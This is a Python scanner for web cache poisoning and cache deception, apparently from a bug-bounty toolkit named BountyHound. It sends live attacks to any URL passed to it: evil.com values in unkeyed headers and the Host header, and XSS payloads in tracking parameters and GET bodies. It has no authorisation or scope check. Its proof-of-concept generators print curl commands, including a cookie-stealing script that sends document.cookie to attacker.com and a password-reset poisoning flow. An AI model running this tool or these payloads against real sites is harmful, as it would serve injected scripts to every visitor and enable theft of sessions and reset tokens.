"""
Cache Poisoning Tester Agent

Comprehensive web cache poisoning and cache deception testing agent.

Tests for:
- Web cache poisoning via unkeyed headers
- Cache deception attacks
- Cache key normalization issues
- Fat GET request smuggling
- DOS via cache poisoning

This agent identifies vulnerabilities where:
1. Unkeyed inputs (headers/parameters) are reflected in cached responses
2. Dynamic content is cached via path confusion
3. Cache key normalization can be exploited

Author: BountyHound Team
Version: 1.0.0
"""

from engine.core.tool_bridge import sync_nuclei_scan, sync_nmap_scan, sync_ffuf_fuzz, sync_sqlmap_test, sync_amass_enum, sync_gobuster_enum, sync_bloodhound_enum, sync_metasploit_execute, sync_nessus_scan, sync_volatility_analyze, sync_zeek_analyze
import requests
import time
import hashlib
import random
import string
import re
from typing import List, Dict, Optional, Tuple, Any
from urllib.parse import urlparse, urlencode, quote, unquote
from dataclasses import dataclass, field
from datetime import datetime
from colorama import Fore, Style
from engine.core.db_hooks import DatabaseHooks
from engine.core.database import BountyHoundDB
from engine.core.payload_hooks import PayloadHooks



@dataclass
class CachePoisoningTest:
    """Represents a single cache poisoning test."""
    name: str
    category: str
    severity: str  # CRITICAL, HIGH, MEDIUM, LOW, INFO
    description: str
    test_type: str  # unkeyed_header, cache_deception, normalization, fat_get


@dataclass
class CachePoisoningFinding:
    """Represents a cache poisoning vulnerability finding."""
    severity: str
    title: str
    category: str
    description: str
    evidence: Dict[str, Any]
    impact: str
    poc: str
    recommendation: str
    endpoint: str
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())
    cwe_id: str = "CWE-444"  # HTTP Request Smuggling (closest match for cache poisoning)

    def to_dict(self) -> Dict:
        """Convert finding to dictionary."""
        return {
            'severity': self.severity,
            'title': self.title,
            'category': self.category,
            'description': self.description,
            'evidence': self.evidence,
            'impact': self.impact,
            'poc': self.poc,
            'recommendation': self.recommendation,
            'endpoint': self.endpoint,
            'timestamp': self.timestamp,
            'cwe_id': self.cwe_id
        }


class CacheDetector:
    """Detect caching behavior and CDN provider."""

    # Cache headers to check
    CACHE_HEADERS = [
        'X-Cache',
        'X-Cache-Status',
        'CF-Cache-Status',  # Cloudflare
        'X-Varnish',
        'X-Fastly-Cache-Status',
        'Akamai-Cache-Status',
        'Age',
        'Cache-Control',
        'X-Proxy-Cache',
        'X-Cache-Hits',
        'Server-Timing'
    ]

    def __init__(self, target_url: str, timeout: int = 10):
        """
        Initialize cache detector.

        Args:
            target_url: Target URL to test
            timeout: Request timeout in seconds
        """
        self.target_url = target_url
        self.timeout = timeout
        self.cache_info = {}

    def detect_cache(self) -> Dict[str, Any]:
        """
        Detect if response is cached and identify CDN provider.

        Returns:
            Dictionary with cache_detected, cache_provider, cache_status, etc.
        """
        print(f"\n{Fore.CYAN}[*] Detecting cache behavior on {self.target_url}{Style.RESET_ALL}")

        try:
            # Make first request
            response1 = requests.get(self.target_url, timeout=self.timeout, verify=False)

            cache_detected = False
            cache_info = {
                'cache_detected': False,
                'cache_provider': None,
                'cache_status': None,
                'cache_headers': {},
                'ttl': None
            }

            # Check cache headers
            for header in self.CACHE_HEADERS:
                value = response1.headers.get(header)
                if value:
                    cache_info['cache_headers'][header] = value

                    # Detect cache provider
                    if 'CF-' in header or 'cloudflare' in value.lower():
                        cache_info['cache_provider'] = 'Cloudflare'
                    elif 'Fastly' in header or 'fastly' in value.lower():
                        cache_info['cache_provider'] = 'Fastly'
                    elif 'Akamai' in header or 'akamai' in value.lower():
                        cache_info['cache_provider'] = 'Akamai'
                    elif 'Varnish' in header:
                        cache_info['cache_provider'] = 'Varnish'

                    # Check cache status
                    if value.lower() in ['hit', 'miss', 'expired', 'stale', 'bypass', 'updating']:
                        cache_info['cache_status'] = value.lower()
                        cache_detected = True

            # Check Age header for TTL
            age = response1.headers.get('Age')
            if age:
                cache_info['ttl'] = int(age)
                if int(age) > 0:
                    cache_detected = True
                    cache_info['cache_status'] = cache_info['cache_status'] or 'detected_via_age'

            # If no explicit cache headers, test with multiple requests
            if not cache_detected:
                cache_detected = self._test_cache_behavior()
                if cache_detected:
                    cache_info['cache_status'] = 'detected_via_testing'

            cache_info['cache_detected'] = cache_detected

            if cache_detected:
                print(f"  {Fore.GREEN}✓ Cache detected: {cache_info['cache_provider'] or 'Unknown'}{Style.RESET_ALL}")
                print(f"    Status: {cache_info['cache_status']}")
            else:
                print(f"  {Fore.YELLOW}✗ No cache detected{Style.RESET_ALL}")

            self.cache_info = cache_info
            return cache_info

        except Exception as e:
            print(f"  {Fore.RED}Error detecting cache: {str(e)}{Style.RESET_ALL}")
            return {'cache_detected': False, 'error': str(e)}

    def _test_cache_behavior(self) -> bool:
        """
        Test cache behavior via multiple requests.

        Returns:
            True if cache detected
        """
        try:
            # Add unique query parameter
            cache_buster = random.randint(10000, 99999)
            unique_url = f"{self.target_url}?_cache_test={cache_buster}"

            # Make two requests to the same URL
            response1 = requests.get(unique_url, timeout=self.timeout, verify=False)
            time.sleep(0.5)
            response2 = requests.get(unique_url, timeout=self.timeout, verify=False)

            # Check if responses are identical
            if response1.text == response2.text:
                # Check if dynamic headers changed (indicate caching)
                dynamic_headers = ['Date', 'Set-Cookie', 'X-Request-ID', 'X-Request-Id']
                headers_changed = False

                for header in dynamic_headers:
                    val1 = response1.headers.get(header)
                    val2 = response2.headers.get(header)
                    if val1 and val2 and val1 != val2:
                        headers_changed = True
                        break

                # If headers didn't change, likely cached
                if not headers_changed:
                    return True

            return False

        except Exception:
            return False


class UnkeyedInputTester:
    """Test for unkeyed inputs in cache."""

    # Common unkeyed headers
    UNKEYED_HEADERS = [
        'X-Forwarded-Host',
        'X-Forwarded-Server',
        'X-Forwarded-Scheme',
        'X-Original-URL',
        'X-Rewrite-URL',
        'X-Host',
        'X-Original-Host',
        'X-Forwarded-Prefix',
        'Forwarded',
        'True-Client-IP',
        'X-Wap-Profile',
        'X-Custom-Header',
        'X-Forwarded-Proto',
        'X-Forwarded-Port',
        'X-Original-Scheme',
        'X-HTTP-Method-Override',
        'X-HTTP-Method',
        'X-Method-Override'
    ]

    def __init__(self, target_url: str, timeout: int = 10):
        """
        Initialize unkeyed input tester.

        Args:
            target_url: Target URL to test
            timeout: Request timeout in seconds
        """
        self.target_url = target_url
        self.timeout = timeout
        self.findings: List[CachePoisoningFinding] = []

    def test_all_unkeyed_inputs(self) -> List[CachePoisoningFinding]:
        """
        Test all potential unkeyed inputs.

        Returns:
            List of findings
        """
        print(f"\n{Fore.YELLOW}[*] Testing unkeyed inputs...{Style.RESET_ALL}")

        self.test_unkeyed_headers()
        self.test_unkeyed_parameters()
        self.test_host_header()

        return self.findings

    def test_unkeyed_headers(self) -> None:
        """Test for unkeyed headers."""
        print("  Testing unkeyed headers...")

        for header in self.UNKEYED_HEADERS:
            # Generate unique identifier
            cache_buster = ''.join(random.choices(string.ascii_lowercase, k=8))
            test_value = f'evil.com/{cache_buster}'

            try:
                # Make request with test header
                response1 = requests.get(
                    self.target_url,
                    headers={header: test_value},
                    timeout=self.timeout,
                    verify=False
                )

                # Check if header value appears in response
                if cache_buster in response1.text or test_value in response1.text:
                    print(f"    {Fore.CYAN}Reflected: {header}{Style.RESET_ALL}")

                    # Wait for cache to populate
                    time.sleep(1)

                    # Make second request WITHOUT the header
                    response2 = requests.get(self.target_url, timeout=self.timeout, verify=False)

                    # If cache_buster still in response, it was cached
                    if cache_buster in response2.text:
                        finding = CachePoisoningFinding(
                            severity='HIGH',
                            title=f'Web Cache Poisoning - Unkeyed Header ({header})',
                            category='Unkeyed Header',
                            description=f'Header {header} is unkeyed and reflected in cached response. '
                                       f'An attacker can poison the cache by sending a malicious {header} value, '
                                       f'which will be cached and served to all subsequent users.',
                            evidence={
                                'header': header,
                                'test_value': test_value,
                                'cache_buster': cache_buster,
                                'reflected_in_first_request': True,
                                'persisted_in_second_request': True,
                                'response1_snippet': response1.text[:200],
                                'response2_snippet': response2.text[:200]
                            },
                            impact='XSS, open redirect, or content injection affecting all users who access the cached resource',
                            poc=self._generate_header_poc(header, cache_buster),
                            recommendation=f'Include {header} in the cache key or do not reflect untrusted headers in responses',
                            endpoint=self.target_url
                        )
                        self.findings.append(finding)
                        print(f"    {Fore.RED}✓ VULNERABLE: {header} is unkeyed and cached!{Style.RESET_ALL}")

            except Exception as e:
                # Silent fail for individual tests
                pass

    def test_unkeyed_parameters(self) -> None:
        """Test for unkeyed query parameters."""
        print("  Testing unkeyed parameters...")

        # Common tracking parameters that might be unkeyed
        test_params = ['utm_content', 'utm_source', 'fbclid', 'gclid', '_ga']

        for param in test_params:
            cache_buster = ''.join(random.choices(string.ascii_lowercase, k=8))
            test_value = f'<img src=x onerror=alert("{cache_buster}")>'

            try:
                # URL encode the value
                encoded_value = quote(test_value)
                test_url = f"{self.target_url}?{param}={encoded_value}"

                # Make request
                response1 = requests.get(test_url, timeout=self.timeout, verify=False)

                # Check if reflected
                if cache_buster in response1.text:
                    print(f"    {Fore.CYAN}Reflected: {param}{Style.RESET_ALL}")

                    # Wait for cache
                    time.sleep(1)

                    # Test if cached (request without parameter)
                    response2 = requests.get(self.target_url, timeout=self.timeout, verify=False)

                    if cache_buster in response2.text:
                        finding = CachePoisoningFinding(
                            severity='CRITICAL',
                            title=f'Web Cache Poisoning - Unkeyed Parameter ({param})',
                            category='Unkeyed Parameter',
                            description=f'Parameter {param} is unkeyed and reflected in response. '
                                       f'This allows stored XSS via cache poisoning.',
                            evidence={
                                'parameter': param,
                                'test_value': test_value,
                                'cache_buster': cache_buster,
                                'test_url': test_url,
                                'reflected': True,
                                'cached': True
                            },
                            impact='Stored XSS via cache poisoning affecting all users',
                            poc=self._generate_param_poc(param, cache_buster),
                            recommendation=f'Include {param} in cache key or strip tracking parameters before caching',
                            endpoint=self.target_url
                        )
                        self.findings.append(finding)
                        print(f"    {Fore.RED}✓ VULNERABLE: {param} is unkeyed!{Style.RESET_ALL}")

            except Exception:
                pass

    def test_host_header(self) -> None:
        """Test Host header cache poisoning."""
        print("  Testing Host header...")

        cache_buster = ''.join(random.choices(string.ascii_lowercase, k=8))
        evil_host = f'evil.com/{cache_buster}'

        try:
            # Parse original URL
            parsed = urlparse(self.target_url)

            # Make request with evil host
            response = requests.get(
                self.target_url,
                headers={'Host': evil_host},
                timeout=self.timeout,
                verify=False,
                allow_redirects=False
            )

            if cache_buster in response.text:
                finding = CachePoisoningFinding(
                    severity='HIGH',
                    title='Web Cache Poisoning - Host Header',
                    category='Host Header Poisoning',
                    description='Host header is reflected in response and potentially cached. '
                               'This can lead to password reset poisoning, XSS, or cache poisoning.',
                    evidence={
                        'evil_host': evil_host,
                        'cache_buster': cache_buster,
                        'reflected': True,
                        'response_snippet': response.text[:200]
                    },
                    impact='Password reset poisoning, XSS, cache poisoning affecting all users',
                    poc=self._generate_host_poc(evil_host),
                    recommendation='Validate Host header against whitelist, do not reflect in responses',
                    endpoint=self.target_url
                )
                self.findings.append(finding)
                print(f"    {Fore.RED}✓ VULNERABLE: Host header reflected!{Style.RESET_ALL}")

        except Exception:
            pass

    def _generate_header_poc(self, header: str, cache_buster: str) -> str:
        """Generate POC for header-based cache poisoning."""
        return f"""# Step 1: Poison the cache
curl -X GET '{self.target_url}' \\
  -H '{header}: evil.com/{cache_buster}' \\
  -v

# Step 2: Verify cache poisoning (request without header)
curl -X GET '{self.target_url}' -v

# Expected: Response contains 'evil.com/{cache_buster}'
# Impact: All users receive poisoned response until cache expires

# Exploitation:
# - Replace with XSS payload: {header}: <script>alert(document.domain)</script>
# - Or redirect: {header}: javascript:alert(1)
"""

    def _generate_param_poc(self, param: str, cache_buster: str) -> str:
        """Generate POC for parameter-based cache poisoning."""
        return f"""# Step 1: Poison the cache
curl -X GET '{self.target_url}?{param}=<script>alert("{cache_buster}")</script>' -v

# Step 2: Verify cache poisoning
curl -X GET '{self.target_url}' -v

# Expected: Response contains the script tag
# Impact: Stored XSS affecting all users

# Full exploitation:
curl -X GET '{self.target_url}?{param}=<script>fetch("https://attacker.com/steal?c="+document.cookie)</script>'
"""

    def _generate_host_poc(self, evil_host: str) -> str:
        """Generate POC for Host header poisoning."""
        return f"""# Password reset poisoning example
curl -X GET '{self.target_url}/password-reset' \\
  -H 'Host: {evil_host}' \\
  -v

# The reset email will contain: https://{evil_host}/reset?token=...
# Victim clicks link, attacker captures token
"""


class CacheDeceptionTester:
    """Test for cache deception attacks."""

    # Extensions typically cached
    CACHED_EXTENSIONS = ['.js', '.css', '.jpg', '.png', '.gif', '.ico', '.woff', '.woff2', '.svg', '.webp']

    # Delimiters for path confusion
    DELIMITERS = ['%23', '%3F', '%3B', '%0D', '%0A', '%2F%2F']

    def __init__(self, target_url: str, timeout: int = 10):
        """
        Initialize cache deception tester.

        Args:
            target_url: Target URL to test
            timeout: Request timeout in seconds
        """
        self.target_url = target_url
        self.timeout = timeout
        self.findings: List[CachePoisoningFinding] = []

    def test_all_cache_deception(self) -> List[CachePoisoningFinding]:
        """
        Test all cache deception vectors.

        Returns:
            List of findings
        """
        print(f"\n{Fore.YELLOW}[*] Testing cache deception...{Style.RESET_ALL}")

        self.test_extension_confusion()
        self.test_path_confusion()
        self.test_delimiter_confusion()

        return self.findings

    def test_extension_confusion(self) -> None:
        """Test cache deception via file extensions."""
        print("  Testing extension confusion...")

        parsed = urlparse(self.target_url)

        # Only test if URL doesn't already have a static extension
        if not any(ext in parsed.path for ext in self.CACHED_EXTENSIONS):
            for ext in self.CACHED_EXTENSIONS[:4]:  # Test subset
                test_url = f"{self.target_url}{ext}"

                try:
                    response = requests.get(test_url, timeout=self.timeout, verify=False)

                    # If we get 200 (not 404)
                    if response.status_code == 200:
                        # Check for sensitive data indicators
                        sensitive_indicators = [
                            'username', 'email', 'balance', 'account',
                            'profile', 'dashboard', 'api_key', 'token',
                            'csrf', 'session'
                        ]

                        if any(indicator in response.text.lower() for indicator in sensitive_indicators):
                            # Check if cached
                            cache_headers = response.headers.get('X-Cache') or response.headers.get('CF-Cache-Status') or ''

                            if 'hit' in cache_headers.lower() or response.headers.get('Age'):
                                finding = CachePoisoningFinding(
                                    severity='HIGH',
                                    title=f'Cache Deception - Extension Confusion ({ext})',
                                    category='Cache Deception',
                                    description=f'Dynamic page is cached when accessed with extension {ext}. '
                                               f'Sensitive user data may be cached and accessible to attackers.',
                                    evidence={
                                        'test_url': test_url,
                                        'extension': ext,
                                        'status_code': response.status_code,
                                        'cache_headers': cache_headers,
                                        'sensitive_data_present': True,
                                        'response_snippet': response.text[:200]
                                    },
                                    impact='Sensitive user data cached and accessible to attacker via shared cache',
                                    poc=self._generate_extension_poc(ext),
                                    recommendation='Do not cache dynamic pages, validate file extensions before caching',
                                    endpoint=self.target_url
                                )
                                self.findings.append(finding)
                                print(f"    {Fore.RED}✓ VULNERABLE: Extension {ext} causes caching!{Style.RESET_ALL}")

                except Exception:
                    pass

    def test_path_confusion(self) -> None:
        """Test cache deception via path confusion."""
        print("  Testing path confusion...")

        # Test with static file path appended
        test_paths = [
            f'{self.target_url}/static.css',
            f'{self.target_url}/app.js',
            f'{self.target_url}/%0A.css',  # LF + extension
            f'{self.target_url}/%0D.js',   # CR + extension
        ]

        for test_url in test_paths:
            try:
                response = requests.get(test_url, timeout=self.timeout, verify=False, allow_redirects=False)

                if response.status_code == 200 and len(response.text) > 100:
                    # Check for caching
                    cache_status = response.headers.get('X-Cache') or response.headers.get('CF-Cache-Status') or ''

                    if 'hit' in cache_status.lower():
                        finding = CachePoisoningFinding(
                            severity='HIGH',
                            title='Cache Deception - Path Confusion',
                            category='Cache Deception',
                            description=f'Path confusion causes dynamic content to be cached. URL: {test_url}',
                            evidence={
                                'test_url': test_url,
                                'status_code': response.status_code,
                                'cached': True,
                                'cache_headers': cache_status
                            },
                            impact='Sensitive data cached via path confusion',
                            poc=self._generate_path_poc(test_url),
                            recommendation='Normalize paths before cache key generation, reject malformed paths',
                            endpoint=self.target_url
                        )
                        self.findings.append(finding)
                        print(f"    {Fore.RED}✓ VULNERABLE: Path confusion with {test_url}!{Style.RESET_ALL}")

            except Exception:
                pass

    def test_delimiter_confusion(self) -> None:
        """Test cache deception via delimiter confusion."""
        print("  Testing delimiter confusion...")

        for delimiter in self.DELIMITERS[:3]:  # Test subset
            test_url = f'{self.target_url}{delimiter}static.css'

            try:
                response = requests.get(test_url, timeout=self.timeout, verify=False, allow_redirects=False)

                if response.status_code == 200 and len(response.text) > 100:
                    print(f"    {Fore.CYAN}Delimiter {delimiter} bypassed{Style.RESET_ALL}")

            except Exception:
                pass

    def _generate_extension_poc(self, ext: str) -> str:
        """Generate POC for extension confusion."""
        return f"""# Attack flow:
# 1. Attacker sends victim to: {self.target_url}{ext}
# 2. Victim's session data is cached
# 3. Attacker accesses same URL: {self.target_url}{ext}
# 4. Attacker receives victim's cached data

# Example:
# Victim visits: https://bank.com/account/balance{ext}
# Cache stores response with victim's balance
# Attacker visits same URL and sees cached balance
"""

    def _generate_path_poc(self, test_url: str) -> str:
        """Generate POC for path confusion."""
        return f"""# Path confusion cache deception:
curl '{test_url}' -v

# If cached, subsequent access to same URL retrieves cached data
"""


class FatGETTester:
    """Test for Fat GET (POST body in GET request)."""

    def __init__(self, target_url: str, timeout: int = 10):
        """
        Initialize Fat GET tester.

        Args:
            target_url: Target URL to test
            timeout: Request timeout in seconds
        """
        self.target_url = target_url
        self.timeout = timeout
        self.findings: List[CachePoisoningFinding] = []

    def test_fat_get(self) -> List[CachePoisoningFinding]:
        """
        Test for Fat GET vulnerabilities.

        Returns:
            List of findings
        """
        print(f"\n{Fore.YELLOW}[*] Testing Fat GET...{Style.RESET_ALL}")

        cache_buster = ''.join(random.choices(string.ascii_lowercase, k=8))

        try:
            # Try sending POST body with GET request
            response = requests.request(
                'GET',
                self.target_url,
                data={'evil_param': f'<script>alert("{cache_buster}")</script>'},
                timeout=self.timeout,
                verify=False
            )

            if cache_buster in response.text:
                finding = CachePoisoningFinding(
                    severity='HIGH',
                    title='Fat GET - POST Body in GET Request',
                    category='Fat GET',
                    description='Server processes POST body in GET request. If POST body is not in cache key, '
                               'this allows cache poisoning.',
                    evidence={
                        'cache_buster': cache_buster,
                        'reflected': True,
                        'response_snippet': response.text[:200]
                    },
                    impact='Cache poisoning if POST body not included in cache key',
                    poc=self._generate_fat_get_poc(cache_buster),
                    recommendation='Reject POST body in GET requests or include in cache key',
                    endpoint=self.target_url
                )
                self.findings.append(finding)
                print(f"  {Fore.RED}✓ VULNERABLE: Fat GET possible!{Style.RESET_ALL}")

        except Exception:
            pass

        return self.findings

    def _generate_fat_get_poc(self, cache_buster: str) -> str:
        """Generate POC for Fat GET."""
        return f"""# Fat GET cache poisoning:
curl -X GET '{self.target_url}' \\
  -H 'Content-Type: application/x-www-form-urlencoded' \\
  -d 'evil_param=<script>alert("{cache_buster}")</script>'

# If server processes body and doesn't include it in cache key,
# the poisoned response will be cached
"""


class CachePoisoningTester:
    """
    Comprehensive cache poisoning tester.

    Tests for web cache poisoning, cache deception, and related vulnerabilities.
    """

    def __init__(self, target_url: str, target: Optional[str] = None, timeout: int = 10):
        """
        Initialize cache poisoning tester.

        Args:
            target_url: Target URL to test
            target: Target identifier for database (default: extracted from URL)
            timeout: Request timeout in seconds
        """
        self.target_url = target_url.rstrip('/')
        self.timeout = timeout
        self.findings: List[CachePoisoningFinding] = []
        self.tests_run = 0

        # Extract domain from URL for database tracking
        if target:
            self.target = target
        else:
            parsed = urlparse(target_url)
            self.target = parsed.netloc or "unknown-target"

        # Disable SSL warnings
        requests.packages.urllib3.disable_warnings()

    def run_all_tests(self) -> List[CachePoisoningFinding]:
        """
        Run all cache poisoning tests.

        Returns:
            List of findings
        """
        # Database check
        print(f"{Fore.CYAN}[DATABASE] Checking history for {self.target}...{Style.RESET_ALL}")
        context = DatabaseHooks.before_test(self.target, 'cache_poisoning_tester')

        if context['should_skip']:
            print(f"{Fore.YELLOW}[SKIP] {context['reason']}{Style.RESET_ALL}")
            if context.get('previous_findings'):
                print(f"Previous findings: {len(context['previous_findings'])}")
            return []
        else:
            print(f"{Fore.GREEN}[OK] {context['reason']}{Style.RESET_ALL}")

        print(f"{Fore.CYAN}[*] Starting comprehensive cache poisoning testing...{Style.RESET_ALL}")
        print(f"[*] Target: {self.target_url}")
        print(f"[*] Timeout: {self.timeout}s")

        # Phase 1: Detect cache
        detector = CacheDetector(self.target_url, self.timeout)
        cache_info = detector.detect_cache()

        if not cache_info.get('cache_detected'):
            print(f"{Fore.YELLOW}[!] No cache detected, skipping tests{Style.RESET_ALL}")
            # Still record the run
            db = BountyHoundDB()
            db.record_tool_run(self.target, 'cache_poisoning_tester', findings_count=0, success=True)
            return []

        # Phase 2: Test unkeyed inputs
        unkeyed_tester = UnkeyedInputTester(self.target_url, self.timeout)
        unkeyed_findings = unkeyed_tester.test_all_unkeyed_inputs()
        self.findings.extend(unkeyed_findings)

        # Phase 3: Test cache deception
        deception_tester = CacheDeceptionTester(self.target_url, self.timeout)
        deception_findings = deception_tester.test_all_cache_deception()
        self.findings.extend(deception_findings)

        # Phase 4: Test Fat GET
        fat_get_tester = FatGETTester(self.target_url, self.timeout)
        fat_get_findings = fat_get_tester.test_fat_get()
        self.findings.extend(fat_get_findings)

        # Record results in database
        db = BountyHoundDB()
        db.record_tool_run(
            self.target,
            'cache_poisoning_tester',
            findings_count=len(self.findings),
            success=True
        )

        # Record successful payloads
        for finding in self.findings:
            if finding.severity in ['CRITICAL', 'HIGH']:
                # Extract payload from evidence
                if 'test_value' in finding.evidence:
                    PayloadHooks.record_payload_success(
                        payload_text=finding.evidence['test_value'],
                        vuln_type='Cache Poisoning',
                        context=finding.category,
                        notes=finding.title
                    )

        print(f"\n{Fore.CYAN}=== CACHE POISONING TESTING COMPLETE ==={Style.RESET_ALL}")
        print(f"Findings: {len(self.findings)}")

        if self.findings:
            self._print_findings_summary()

        return self.findings

    def _print_findings_summary(self) -> None:
        """Print summary of findings."""
        print(f"\n{Fore.RED}[!] CACHE POISONING VULNERABILITIES FOUND:{Style.RESET_ALL}")

        # Group by severity
        by_severity = {}
        for finding in self.findings:
            if finding.severity not in by_severity:
                by_severity[finding.severity] = []
            by_severity[finding.severity].append(finding)

        # Print by severity
        for severity in ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW', 'INFO']:
            if severity in by_severity:
                findings_list = by_severity[severity]
                print(f"\n{severity}: {len(findings_list)}")
                for f in findings_list:
                    print(f"  - {f.title}")
                    print(f"    Endpoint: {f.endpoint}")

    def get_findings(self) -> List[CachePoisoningFinding]:
        """Get all findings."""
        return self.findings

    def get_findings_by_severity(self, severity: str) -> List[CachePoisoningFinding]:
        """Get findings by severity level."""
        return [f for f in self.findings if f.severity == severity]


def main():
    """CLI interface."""
    import sys

    if len(sys.argv) < 2:
        print("Usage: python cache_poisoning_tester.py <url>")
        print("Example: python cache_poisoning_tester.py 'https://example.com'")
        sys.exit(1)

    target_url = sys.argv[1]

    tester = CachePoisoningTester(target_url)
    findings = tester.run_all_tests()

    print(f"\n{Fore.CYAN}=== FINAL RESULTS ==={Style.RESET_ALL}")
    print(f"Total findings: {len(findings)}")

    if findings:
        print(f"\n{Fore.RED}[!] Cache poisoning vulnerabilities detected!{Style.RESET_ALL}")
        print("Review findings and validate manually.")


if __name__ == "__main__":
    main()
